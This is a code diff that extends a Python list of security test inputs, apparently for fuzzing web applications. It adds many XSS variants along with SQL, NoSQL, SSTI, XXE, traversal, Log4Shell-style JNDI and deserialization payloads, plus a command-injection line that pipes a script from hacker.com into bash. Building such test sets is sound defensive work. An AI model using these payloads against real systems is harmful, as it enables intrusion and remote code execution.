@@ -99,14 +99,107 @@ TEST_VALUES = {
         "1; SELECT pg_sleep(10)--",
         "{\"username\":{\"$ne\": \"\"}, \"password\":{\"$ne\": \"\"}}",
         "; ls -la", "| whoami", "`id`",
+        "; curl http://hacker.com/shell.sh | bash", # OS Command Injection
         "{{7*7}}", "${7*7}}", "<%= 7*7 %>",
+        "{{ 7 * 7 }}", # SSTI / Vue
+        "\"$ne\": 1", "{\"query\": \"${gt: ''}\"}", "{\"username\": {\"$gt\": \"\"}}", # NoSQL Injections
+        "${jndi:ldap://hacker.com/Exploit}", # Java JNDI RCE
+        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}", # Fastjson Deserialization
+        "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")", # Spring SpEL RCE
+        # --- Traversal Tomcat ---
+        "../..;/", "/..;/", "..;/",
         # --- Traversal & File Inclusion ---
         "../../../../etc/passwd", "../../../../../windows/system32/drivers/etc/hosts",
+        "..%2f..%2f..%2fetc%2fpasswd", # Encoded Traversal
         "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
-        # --- XSS Payloads ---
+        "<iframe src=\"file:///etc/passwd\">test</iframe>", # XSS/LFI
+        "<pd4ml:attachment src=\"/etc/passwd\" description=\"almond\" icon=\"Paperclip\"/>", # PDF Attachment LFI
+        # --- XXE ---
+        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+        # --- XSS & HTML Payloads ---
         "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
         "javascript:alert(1)",
+        "<svg onload=alert(1)>",
+        "<video change=\"alert(this.ssss)\">",
+        "alert(this.qss)",
+        "<body change=\"this.fssf\">",
+        "abort=\"prompt(document.location.href",
+        "&lt;script&gt;alert(1)&lt;/script&gt;", # HTML Encoded
+        "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E", # Unicode Encoded
+        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # Hex Encoded
+        "%3Cscript%3Ealert(1)%3C%2Fscript%3E", # URL Encoded
+        "<object data=\"data:text/html,<script>alert(1)</script>\">",
+        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
+        "<script>alert`1`</script>",
+        "<a href=\"jav&#x09;ascript:alert(1)\">Cliquez ici</a>",
+        "<script>let x = 'coo' + 'kie'; console.log(document[x]); window['al' + 'ert'](1);</script>",
+        "</span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
+        "<html>", "</html>", "<style>", "</style>", "<script>", "</script>",
+        "<area draggable=\"true\" ondragstart=\"alert(1)\">test</area>",
+        "<meter oncut=\"alert(1)\" contenteditable>test</meter>",
+        "<input onchange=alert(1) value=xss>",
+        "<main onmousedown=\"alert(1)\">test</main>",
+        "<command oncontextmenu=\"alert(1)\">test</command>",
+        "<samp onmousemove=\"alert(1)\">test</samp>",
+        "<script onmousemove=\"alert(1)\">test</script>",
+        "<iframe onmouseenter=\"alert(1)\">test</iframe>",
+        "<keygen onmouseleave=\"alert(1)\">test</keygen>",
+        "<hr id=x tabindex=1 onactivate=alert(1)></hr>",
+        "<blockquote onbeforepaste=\"alert(1)\" contenteditable>test</blockquote>",
+        "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>",
+        "<html onbeforecut=\"alert(1)\" contenteditable>test</html>",
+        "<select onchange=alert(1)><option>change me</option><option>XSS</option></select>",
+        "<img2 onpointermove=alert(1)>XSS</img2>",
+        "<span onclick=\"chrome://settings/\">",
+        "<tr onpointerup=alert(1)>XSS</tr>",
+        "<track onmouseleave=\"alert(1)\">test</track>",
+        "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationend=\"alert(1)\"></plainte",
+        "<style>@keyframes x{}</style><body style=\"animation-name:x\" onanimationstart=\"alert(1)\"></body>",
+        "<strike onpointerover=alert(1)>XSS</strike>",
+        "<style>:target {color:red;}</style><b id=x style=\"transition:color 1s\" ontransitionend=alert(1)></b>",
+        "<svg><spacer onload=alert(1)></spacer></svg>",
+        "<style>:target {transform: rotate(180deg);}</style><kbd id=x style=\"transition:transform 2s\" transform-origin: bottom left;\"",
+        "<a onclick=\"bad\">", "<span onclick=\"\\\\:#chrome\">",
+        "<link src=\"http://url.to.file.which/not.exist\">",
+        "<a href=\"javascript:alert(1)\">",
+        "<b onmouseover=alert('Wufff!')>click me!</b>",
+        "<IMG SRC=j&#X41vascript:alert('test2')>",
+        "<img src=\"http://url.to.file.which/not.exist\"/>",
+        "<img onerror=alert(document.cookie);>",
+        "document.cookie",
+        "[1].find(alert)",
+        "document['body'].innerHTML=",
+        "document.getElementById('x').innerHTML=",
+        "#<img src=x onerror=alert(1)>",
+        "?search=<img src=x onerror=alert(1)>",
+        "document.write('... USER_INPUT ...') ",
+        "element.innerHTML = '... USER_INPUT ...' ",
+        "$(\"#element\").html('... USER_INPUT ...')",
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<IMG SRC=x onerror=alert(1)>",
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<img src=x onerror=alert&#x28;1&#x29>",
+        "site.com/page#<img src=x onerror=alert(1)>",
+        "site.com/page#javascript:alert(1)",
+        "localStorage.setItem('test', '<img src=x onerror=alert(1)>');",
+        "sessionStorage.setItem('test', '<img src=x onerror=alert(1)>');",
+        "site.com/page?name=<div onmouseover='alert(1)'>",
+        "site.com/page?name=</script><script>alert(1)</script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<svg/onload=alert(1)>",
+        "<q/oncut=alert(1)>",
+        "<div data-react-props=\"{'dangerouslySetInnerHTML':{'__html':'<img src=x onerror=alert(1)>'}}\">",
+        "\\';alert(1)//", "';alert(1)//", "'-alert(1)-'", "\" onmouseover=\"alert(1)",
+        "<script type=\"importmap\">{\"imports\": {\"x\": \"data:text/javascript,alert(1)\"}}</script>",
+        "<div id=x></div><script>x.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>",
+        "<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>",
+        "<META HTTP-EQUIV=\"refresh\"\nCONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg\">",
+        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>",
+        "<a href=\"javascript&colon;alert(1)\">Click</a>",
+        "<a href=\"javascript&#58;alert(1)\">Click</a>",
+        "<a href=\"javascript&#0058;alert(1)\">Click</a>",
         # --- Edge Cases & Fuzzing ---
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Data URI
         "null", "true", "false", "undefined",
         "test@example.com", "550e8400-e29b-41d4-a716-446655440000", # Email & UUID
         "A" * 1024, # Long string
